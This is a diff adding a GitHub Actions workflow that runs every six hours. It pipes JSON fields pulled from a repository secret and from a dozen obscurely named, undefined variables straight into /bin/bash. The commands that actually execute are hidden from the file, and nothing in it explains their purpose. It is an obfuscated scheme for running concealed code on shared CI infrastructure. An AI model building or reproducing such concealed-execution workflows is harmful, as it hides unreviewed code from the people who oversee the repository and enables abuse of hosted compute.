@@ -1,0 +1,30 @@
+name: liaoxindingxiu
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '0 1/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: liaoxindingxiu
+        env:
+          waa8018: ${{ secrets.waa8018 }}
+        run: |
+          echo $waa8018 | jq -r .mdke96 | /bin/bash
+          echo $apr1 | jq -r .cbt62399 | /bin/bash
+          echo $zgeq145 | jq -r .lkh4486 | /bin/bash
+          echo $j699 | jq -r .i10505 | /bin/bash
+          echo $ud61 | jq -r .ojyt7154 | /bin/bash
+          echo $uhx26950 | jq -r .yun79 | /bin/bash
+          echo $q0 | jq -r .ogdqi54 | /bin/bash
+          echo $jlh319 | jq -r .vfr754 | /bin/bash
+          echo $bzydk1315 | jq -r .hpufl77546 | /bin/bash
+          echo $i8933 | jq -r .svpse40200 | /bin/bash
+          echo $pelou261 | jq -r .sq2671 | /bin/bash
+          echo $mnk83316 | jq -r .dqsun92396 | /bin/bash
+          echo $iihs058 | jq -r .plszd1 | /bin/bash
+
